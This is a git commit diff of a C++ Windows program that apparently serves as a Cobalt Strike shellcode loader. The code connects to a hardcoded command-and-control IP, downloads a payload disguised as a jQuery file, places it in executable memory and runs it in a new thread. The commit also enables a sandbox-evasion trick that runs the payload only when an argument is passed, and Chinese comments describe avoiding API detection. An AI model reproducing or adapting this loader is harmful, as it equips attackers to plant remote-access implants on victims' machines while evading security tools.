73fcdb2a74fd5159a6f5f26ede732c4a8126c7c6
Scorpio-m7 <51915181+Scorpio-m7@users.noreply.github.com>
2021-11-01 17:47:16 +0800

    Update code1.cpp

--- code1.cpp
+++ code1.cpp
@@ -2,13 +2,10 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <WinInet.h>
-
-//using namespace std;
-
+using namespace std;
 #pragma comment(lib,"wininet")
-
 int main(int argc, char* argv[]) {
-    //if (argc > 1)//通过传入参数绕过沙箱
+    if (argc > 1)//通过传入参数绕过沙箱
     {
         HINTERNET nethandle = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; WOW64) (KHTML, like Gecko) Chrome/77.0 Safari/536", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);//user-agent可以修改
         if (nethandle == NULL) {
@@ -16,13 +13,13 @@ int main(int argc, char* argv[]) {
             return 0;
         }
         char* host = (char*)"192.168.211.129";//cs的ip
-        HINTERNET Session = InternetConnectA(nethandle, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        HINTERNET Session = InternetConnectA(nethandle, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);//使用https加密传输
         if (Session == NULL)
         {
             printf("internet connect error:%d\n", GetLastError());
             return 0;
         }
-        HINTERNET HttpRequest = HttpOpenRequestA(Session, "GET", "/jquery-3.3.2.slim.min.js", "HTTP/1.0", NULL, NULL, INTERNET_FLAG_DONT_CACHE, 0);//通过get请求profile文件中的url地址
+        HINTERNET HttpRequest = HttpOpenRequestA(Session, "GET", "/jquery-3.3.2.slim.min.js", "HTTP/1.0", NULL, NULL, INTERNET_FLAG_DONT_CACHE, 0);//通过get请求profile文件中64位的url地址
         if (HttpRequest == NULL) {
             printf("http open request error:%d\n", GetLastError());
             return 0;
@@ -49,21 +46,21 @@ int main(int argc, char* argv[]) {
         size = 16;
         ret = HttpQueryInfoA(HttpRequest, HTTP_QUERY_CONTENT_LENGTH, contentL, (LPDWORD)&size, NULL);
         int length = atoi((const char*)contentL);
-        //cout << "length:" << length << "\n";
+        cout << "length:" << length << "\n";
         if (ret == FALSE) {
             printf("htttpqueryinfo error:%d\n", GetLastError());
             return 0;
         }
-        void* c = VirtualAlloc(NULL, length + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        void* c = VirtualAlloc(NULL, length + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//分配内存，保存获取的文件，实现加载器
         int readed = 0;
         InternetReadFile(HttpRequest, c, length + 1, (LPDWORD)&readed);
         char* cc = (char*)c + 11;//跳过配置文件前面追加字符
-        HANDLE ct = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)cc, NULL, 0, NULL);//这里可能会被检测到api
+        HANDLE ct = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)cc, NULL, 0, NULL);//CreateThread的api可能会被检测到
         WaitForSingleObject(ct, INFINITE);
         VirtualFree(c, length + 1, MEM_DECOMMIT);
     }
-    //else {
-    //    printf("hello world\n");
-    //}
+    else {
+        printf("hello world\n");
+    }
     return 0;
 }
